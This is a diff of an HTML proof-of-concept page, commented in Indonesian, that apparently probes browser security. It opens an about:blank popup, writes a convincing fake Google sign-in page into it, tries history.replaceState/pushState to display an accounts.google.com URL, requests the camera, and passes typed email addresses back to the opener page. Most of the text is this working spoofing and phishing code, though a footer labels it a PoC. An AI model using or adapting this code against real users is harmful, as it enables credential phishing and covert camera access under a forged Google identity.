@@ -3,12 +3,13 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Race Condition: Kamera via about:blank</title>
+<title>Google Spoof + Camera Permission</title>
 <style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
   body { font-family: 'Segoe UI', Arial, sans-serif; background: #1a1a2e; color: #e0e0e0; padding: 20px; }
-  h1 { color: #ff6b6b; border-bottom: 2px solid #ff6b6b; padding-bottom: 10px; }
+  h1 { color: #ff6b6b; border-bottom: 2px solid #ff6b6b; padding-bottom: 10px; margin-bottom: 20px; }
   .panel { background: #16213e; padding: 20px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #0f3460; }
-  button { padding: 12px 20px; background: #e94560; color: #fff; border: none; border-radius: 6px; cursor: pointer; margin: 5px; font-size: 14px; width: 100%; }
+  button { padding: 14px 24px; background: #e94560; color: #fff; border: none; border-radius: 6px; cursor: pointer; margin: 5px; font-size: 15px; font-weight: bold; width: 100%; }
   button:hover { background: #c73650; }
   #log { background: #0a0a15; padding: 15px; border-radius: 6px; height: 300px; overflow-y: auto; white-space: pre-wrap; font-family: monospace; font-size: 12px; border: 1px solid #0f3460; }
   .success { color: #4caf50; font-weight: bold; }
@@ -19,15 +20,14 @@
 </head>
 <body>
 
-<h1>⏱️ Race Condition: Kamera via about:blank</h1>
+<h1>📸 Google Spoof + Camera Permission</h1>
 
 <div class="panel">
-  <p style="color:#aaa;">Uji apakah prompt izin kamera bisa muncul dari about:blank dengan timing yang tepat.</p>
-  <button id="btnRace1">1. Race: Tulis + getUserMedia (0ms)</button>
-  <button id="btnRace2">2. Race: getUserMedia via parent setelah window.open</button>
-  <button id="btnRace3">3. Race: microtask + getUserMedia</button>
-  <button id="btnRace4">4. Race: Tanpa document.write (langsung getUserMedia)</button>
-  <button id="clear" style="background:#555;">Bersihkan Log</button>
+  <p style="color:#aaa; margin-bottom:20px;">Uji apakah prompt kamera bisa muncul dari halaman palsu Google di about:blank.</p>
+  <button id="btnCameraRace">1. Race: about:blank + replaceState + Kamera</button>
+  <button id="btnCameraPush">2. about:blank + pushState + Kamera</button>
+  <button id="btnCameraDirect">3. about:blank + Kamera (tanpa history)</button>
+  <button id="clear" style="background:#555; margin-top:10px;">Bersihkan Log</button>
 </div>
 
 <div id="log">Menunggu perintah...</div>
@@ -50,261 +50,235 @@
   }
 
   // ============================================
-  // FUNGSI: KONTEN UNTUK ABOUT:BLANK (meminta kamera)
+  // KONTEN HALAMAN GOOGLE PALSU + KAMERA
   // ============================================
-  function getCameraHTML() {
+  function getGoogleCameraHTML(manipulateHistory) {
     return `
       <!DOCTYPE html>
-      <html><head><title>Camera Access</title></head>
-      <body style="font-family:Arial;text-align:center;padding:30px;">
-        <h2>Camera Permission Test</h2>
-        <p id="status">Meminta izin kamera...</p>
-        <video id="video" autoplay playsinline style="width:100%;max-width:300px;border:1px solid #ccc;margin-top:10px;"></video>
+      <html lang="en">
+      <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Sign in - Google Accounts</title>
+        <style>
+          * { box-sizing: border-box; margin: 0; padding: 0; }
+          body {
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            background: #f0f4f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+          }
+          .login-card {
+            background: #fff;
+            padding: 48px 40px 36px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 450px;
+            text-align: center;
+          }
+          .google-logo {
+            font-size: 24px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 8px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+          }
+          .g-icon {
+            width: 32px;
+            height: 32px;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"><path fill="%23EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="%234285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="%23FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="%2334A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>') no-repeat center;
+            background-size: contain;
+          }
+          h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 10px; }
+          p.subtitle { font-size: 16px; color: #202124; margin-bottom: 30px; }
+          input { width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; margin-bottom: 20px; outline: none; }
+          input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
+          .btn-row { display: flex; justify-content: space-between; align-items: center; margin-top: 10px; }
+          .btn-create { color: #1a73e8; font-weight: 500; font-size: 14px; cursor: pointer; background: none; border: none; padding: 8px; }
+          .btn-next { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
+          .btn-next:hover { background: #1765cc; }
+          .footer { margin-top: 40px; font-size: 12px; color: #5f6368; }
+          .camera-area { margin-top: 20px; padding: 10px; border: 1px dashed #ccc; border-radius: 4px; display: none; }
+          video { width: 100%; max-width: 200px; border-radius: 4px; }
+        </style>
+      </head>
+      <body>
+        <div class="login-card">
+          <div class="google-logo"><div class="g-icon"></div><span>Sign in with Google</span></div>
+          <h1>Sign in</h1>
+          <p class="subtitle">to continue to Gmail</p>
+          <input type="email" id="email" placeholder="Email or phone" autofocus />
+          <div class="btn-row">
+            <button class="btn-create">Create account</button>
+            <button class="btn-next" id="nextBtn">Next</button>
+          </div>
+          <div class="camera-area" id="cameraArea">
+            <p style="font-size:12px;color:#666;">Camera feed:</p>
+            <video id="video" autoplay playsinline></video>
+          </div>
+          <div class="footer">This is a UI Spoofing PoC — not a real Google page.</div>
+        </div>
         <script>
-          (function(){
-            var statusEl = document.getElementById('status');
-            var videoEl = document.getElementById('video');
+          (function() {
+            var statusEl = document.createElement('div');
+            statusEl.style.cssText = 'position:fixed;bottom:10px;right:10px;font-size:10px;color:#999;background:#fff;padding:4px 8px;border-radius:4px;';
+            document.body.appendChild(statusEl);
+            statusEl.textContent = 'Origin: ' + location.origin + ' | Href: ' + location.href;
 
+            ${manipulateHistory ? `
+              try {
+                history.replaceState({ spoof: true }, 'Sign in - Google Accounts', 'https://accounts.google.com/signin/v2/identifier');
+                parent.postMessage({ status: 'replaceState_success', url: 'https://accounts.google.com/signin/v2/identifier' }, '*');
+              } catch(e) {
+                parent.postMessage({ status: 'replaceState_fail', error: e.name + ': ' + e.message }, '*');
+              }
+              try {
+                history.pushState({ spoof: true }, 'Sign in - Google Accounts', 'https://accounts.google.com/signin/v2/identifier');
+                parent.postMessage({ status: 'pushState_success', url: 'https://accounts.google.com/signin/v2/identifier' }, '*');
+              } catch(e) {
+                parent.postMessage({ status: 'pushState_fail', error: e.name + ': ' + e.message }, '*');
+              }
+              try { document.title = 'Sign in - Google Accounts'; } catch(e) {}
+            ` : ''}
+
+            // Fungsi minta kamera
             function requestCamera() {
               if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                statusEl.textContent = 'getUserMedia tidak didukung';
-                parent.postMessage({ status: 'no_api' }, '*');
+                parent.postMessage({ status: 'no_camera_api' }, '*');
                 return;
               }
               navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                 .then(function(stream) {
-                  statusEl.textContent = '✅ IZIN KAMERA DIBERIKAN!';
-                  parent.postMessage({ status: 'granted' }, '*');
-                  videoEl.srcObject = stream;
+                  parent.postMessage({ status: 'camera_granted' }, '*');
+                  document.getElementById('cameraArea').style.display = 'block';
+                  document.getElementById('video').srcObject = stream;
                 })
                 .catch(function(err) {
-                  statusEl.textContent = '❌ Gagal: ' + err.name + ' - ' + err.message;
-                  parent.postMessage({ status: 'error', error: err.name + ': ' + err.message }, '*');
+                  parent.postMessage({ status: 'camera_error', error: err.name + ': ' + err.message }, '*');
                 });
             }
 
-            // Coba langsung
+            // Panggil kamera segera setelah halaman dimuat
+            // (race condition: sebelum origin null diterapkan?)
             requestCamera();
 
-            // Juga coba setelah 100ms
+            // Juga panggil setelah 100ms
             setTimeout(requestCamera, 100);
+
+            document.getElementById('nextBtn').addEventListener('click', function() {
+              parent.postMessage({ status: 'login_attempt', email: document.getElementById('email').value }, '*');
+            });
+
+            parent.postMessage({ status: 'origin_info', origin: location.origin, href: location.href }, '*');
           })();
         <\/script>
-      </body></html>
+      </body>
+      </html>
     `;
   }
 
   // ============================================
-  // METODE 1: Tulis + getUserMedia (0ms)
+  // METODE 1: Race + replaceState + Kamera
   // ============================================
-  document.getElementById('btnRace1').onclick = () => {
-    log('=== METODE 1: Tulis + getUserMedia (0ms) ===', 'info');
+  document.getElementById('btnCameraRace').onclick = () => {
+    log('=== METODE 1: Race + replaceState + Kamera ===', 'info');
 
     const win = window.open('about:blank', '_blank');
     if (!win) { log('❌ Popup diblokir.', 'error'); return; }
     log('Tab about:blank dibuka.', 'success');
 
-    // Race: tulis konten segera
     try {
       win.document.open();
-      win.document.write(getCameraHTML());
+      win.document.write(getGoogleCameraHTML(true));
       win.document.close();
-      log('Konten ditulis ke about:blank.', 'success');
+      log('Konten Google palsu + kamera ditulis.', 'success');
     } catch (e) {
       log('❌ Gagal tulis: ' + e.message, 'error');
       return;
     }
 
-    // Listener pesan
     window.addEventListener('message', (e) => {
       if (e.data && e.data.status) {
         const s = e.data.status;
-        if (s === 'granted') log('✅ IZIN KAMERA DIBERIKAN DARI ABOUT:BLANK!', 'success');
-        else if (s === 'error') log('❌ Gagal: ' + e.data.error, 'error');
-        else if (s === 'no_api') log('❌ API tidak didukung.', 'error');
+        if (s === 'replaceState_success') log('🎯 replaceState BERHASIL ke: ' + e.data.url, 'success');
+        else if (s === 'replaceState_fail') log('❌ replaceState gagal: ' + e.data.error, 'error');
+        else if (s === 'pushState_success') log('🎯 pushState BERHASIL ke: ' + e.data.url, 'success');
+        else if (s === 'pushState_fail') log('❌ pushState gagal: ' + e.data.error, 'error');
+        else if (s === 'origin_info') log('📋 Origin: ' + e.data.origin + ' | Href: ' + e.data.href, 'info');
+        else if (s === 'camera_granted') log('🎯 BUG: IZIN KAMERA DIBERIKAN DARI ABOUT:BLANK!', 'success');
+        else if (s === 'camera_error') log('❌ Kamera gagal: ' + e.data.error, 'error');
+        else if (s === 'no_camera_api') log('❌ getUserMedia tidak didukung.', 'error');
+        else if (s === 'login_attempt') log('⚠️ Login attempt: ' + e.data.email, 'warn');
       }
     }, { once: false });
+
+    log('Perhatikan: prompt kamera mungkin muncul seolah dari Google.', 'warn');
+    log('Jika izin diberikan, itu BUG (Critical).', 'info');
   };
 
   // ============================================
-  // METODE 2: getUserMedia via parent setelah window.open
+  // METODE 2: pushState + Kamera
   // ============================================
-  document.getElementById('btnRace2').onclick = () => {
-    log('=== METODE 2: getUserMedia via Parent ===', 'info');
-
-    // 1. Minta izin kamera dari parent
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-      log('❌ getUserMedia tidak didukung di parent.', 'error');
-      return;
-    }
-
-    log('Meminta izin kamera dari parent...', 'info');
-    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-      .then((stream) => {
-        log('✅ Izin kamera diberikan dari parent.', 'success');
-
-        // 2. Buka about:blank
-        const win = window.open('about:blank', '_blank');
-        if (!win) { log('❌ Popup diblokir.', 'error'); return; }
-        log('Tab about:blank dibuka.', 'success');
-
-        // 3. Tulis konten (yang akan mencoba akses kamera)
-        try {
-          win.document.open();
-          win.document.write(`
-            <!DOCTYPE html>
-            <html><head><title>Camera Access from Blank</title></head>
-            <body style="font-family:Arial;text-align:center;padding:30px;">
-              <h2>Camera Access</h2>
-              <p id="status">Mencoba akses kamera...</p>
-              <video id="video" autoplay playsinline style="width:100%;max-width:300px;border:1px solid #ccc;margin-top:10px;"></video>
-              <script>
-                (function(){
-                  var statusEl = document.getElementById('status');
-                  var videoEl = document.getElementById('video');
-                  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                    statusEl.textContent = 'getUserMedia tidak didukung';
-                    parent.postMessage({ status: 'no_api_blank' }, '*');
-                    return;
-                  }
-                  navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-                    .then(function(stream) {
-                      statusEl.textContent = '✅ IZIN KAMERA DIBERIKAN DARI ABOUT:BLANK!';
-                      parent.postMessage({ status: 'granted_blank' }, '*');
-                      videoEl.srcObject = stream;
-                    })
-                    .catch(function(err) {
-                      statusEl.textContent = '❌ Gagal: ' + err.name;
-                      parent.postMessage({ status: 'error_blank', error: err.name + ': ' + err.message }, '*');
-                    });
-                })();
-              <\/script>
-            </body></html>
-          `);
-          win.document.close();
-          log('Konten ditulis ke about:blank.', 'success');
-        } catch (e) {
-          log('❌ Gagal tulis: ' + e.message, 'error');
-        }
-
-        // Hentikan stream parent (opsional)
-        setTimeout(() => {
-          stream.getTracks().forEach(t => t.stop());
-          log('Stream parent dihentikan.', 'info');
-        }, 5000);
-
-      }).catch((err) => {
-        log('❌ Izin kamera ditolak di parent: ' + err.name + ' - ' + err.message, 'error');
-      });
-
-    // Listener
-    window.addEventListener('message', (e) => {
-      if (e.data && e.data.status) {
-        const s = e.data.status;
-        if (s === 'granted_blank') log('🎯 BUG: IZIN KAMERA DIBERIKAN DARI ABOUT:BLANK!', 'success');
-        else if (s === 'error_blank') log('❌ Gagal di about:blank: ' + e.data.error, 'error');
-        else if (s === 'no_api_blank') log('❌ API tidak didukung di about:blank.', 'error');
-      }
-    }, { once: false });
-  };
-
-  // ============================================
-  // METODE 3: microtask + getUserMedia
-  // ============================================
-  document.getElementById('btnRace3').onclick = () => {
-    log('=== METODE 3: microtask + getUserMedia ===', 'info');
+  document.getElementById('btnCameraPush').onclick = () => {
+    log('=== METODE 2: pushState + Kamera ===', 'info');
 
     const win = window.open('about:blank', '_blank');
     if (!win) { log('❌ Popup diblokir.', 'error'); return; }
     log('Tab about:blank dibuka.', 'success');
 
-    // Gunakan microtask untuk menulis konten secepat mungkin
-    queueMicrotask(() => {
-      try {
-        win.document.open();
-        win.document.write(getCameraHTML());
-        win.document.close();
-        log('Konten ditulis via microtask.', 'success');
-      } catch (e) {
-        log('❌ Gagal tulis: ' + e.message, 'error');
-      }
-    });
+    try {
+      win.document.open();
+      win.document.write(getGoogleCameraHTML(true));
+      win.document.close();
+      log('Konten Google palsu + kamera ditulis.', 'success');
+    } catch (e) {
+      log('❌ Gagal tulis: ' + e.message, 'error');
+    }
 
-    // Listener
     window.addEventListener('message', (e) => {
       if (e.data && e.data.status) {
         const s = e.data.status;
-        if (s === 'granted') log('✅ IZIN KAMERA DIBERIKAN!', 'success');
-        else if (s === 'error') log('❌ Gagal: ' + e.data.error, 'error');
-        else if (s === 'no_api') log('❌ API tidak didukung.', 'error');
+        if (s === 'pushState_success') log('🎯 pushState BERHASIL ke: ' + e.data.url, 'success');
+        else if (s === 'pushState_fail') log('❌ pushState gagal: ' + e.data.error, 'error');
+        else if (s === 'origin_info') log('📋 Origin: ' + e.data.origin + ' | Href: ' + e.data.href, 'info');
+        else if (s === 'camera_granted') log('🎯 BUG: IZIN KAMERA DIBERIKAN!', 'success');
+        else if (s === 'camera_error') log('❌ Kamera gagal: ' + e.data.error, 'error');
       }
     }, { once: false });
   };
 
   // ============================================
-  // METODE 4: Tanpa document.write (langsung getUserMedia via parent)
+  // METODE 3: Kamera tanpa history manipulation
   // ============================================
-  document.getElementById('btnRace4').onclick = () => {
-    log('=== METODE 4: Langsung getUserMedia via parent setelah window.open ===', 'info');
+  document.getElementById('btnCameraDirect').onclick = () => {
+    log('=== METODE 3: Kamera tanpa history ===', 'info');
 
     const win = window.open('about:blank', '_blank');
     if (!win) { log('❌ Popup diblokir.', 'error'); return; }
     log('Tab about:blank dibuka.', 'success');
 
-    // Coba akses getUserMedia dari parent, tapi targetkan video ke about:blank
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-      log('❌ getUserMedia tidak didukung di parent.', 'error');
-      return;
+    try {
+      win.document.open();
+      win.document.write(getGoogleCameraHTML(false));
+      win.document.close();
+      log('Konten Google palsu + kamera ditulis (tanpa history).', 'success');
+    } catch (e) {
+      log('❌ Gagal tulis: ' + e.message, 'error');
     }
 
-    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-      .then((stream) => {
-        log('✅ Izin kamera diberikan dari parent.', 'success');
-
-        // Coba pasang stream ke about:blank (jika bisa)
-        try {
-          win.document.open();
-          win.document.write(`
-            <!DOCTYPE html>
-            <html><head><title>Camera</title></head>
-            <body style="text-align:center;padding:30px;">
-              <h2>Camera</h2>
-              <video id="video" autoplay playsinline style="width:100%;max-width:300px;"></video>
-              <script>
-                parent.postMessage({ status: 'ready_for_stream' }, '*');
-              <\/script>
-            </body></html>
-          `);
-          win.document.close();
-          log('Konten ditulis ke about:blank.', 'success');
-
-          // Setelah 500ms, coba akses video element
-          setTimeout(() => {
-            try {
-              const videoEl = win.document.getElementById('video');
-              if (videoEl) {
-                videoEl.srcObject = stream;
-                log('🎯 Stream kamera DIPASANG ke about:blank! (BUG)', 'success');
-              } else {
-                log('❌ Video element tidak ditemukan.', 'error');
-              }
-            } catch (e) {
-              log('❌ Gagal pasang stream: ' + e.message, 'error');
-            }
-          }, 500);
-
-        } catch (e) {
-          log('❌ Gagal tulis: ' + e.message, 'error');
-        }
-      })
-      .catch((err) => {
-        log('❌ Izin kamera ditolak: ' + err.name + ' - ' + err.message, 'error');
-      });
-
-    // Listener
     window.addEventListener('message', (e) => {
-      if (e.data && e.data.status === 'ready_for_stream') {
-        log('About:blank siap menerima stream.', 'info');
+      if (e.data && e.data.status) {
+        const s = e.data.status;
+        if (s === 'origin_info') log('📋 Origin: ' + e.data.origin + ' | Href: ' + e.data.href, 'info');
+        else if (s === 'camera_granted') log('🎯 BUG: IZIN KAMERA DIBERIKAN!', 'success');
+        else if (s === 'camera_error') log('❌ Kamera gagal: ' + e.data.error, 'error');
       }
     }, { once: false });
   };
@@ -320,9 +294,9 @@
   // ============================================
   // INIT
   // ============================================
-  log('Race Condition Camera PoC siap. Pilih metode di atas.', 'info');
-  log('⚠️ Chrome Android modern memblokir getUserMedia dari about:blank.', 'warn');
-  log('   Jika ada yang berhasil, itu BUG (Critical).', 'info');
+  log('PoC siap. Pilih metode di atas.', 'info');
+  log('⚠️ Browser modern memblokir kamera dari about:blank.', 'warn');
+  log('   Jika prompt muncul, itu BUG (Critical).', 'info');
 
 })();
 </script>
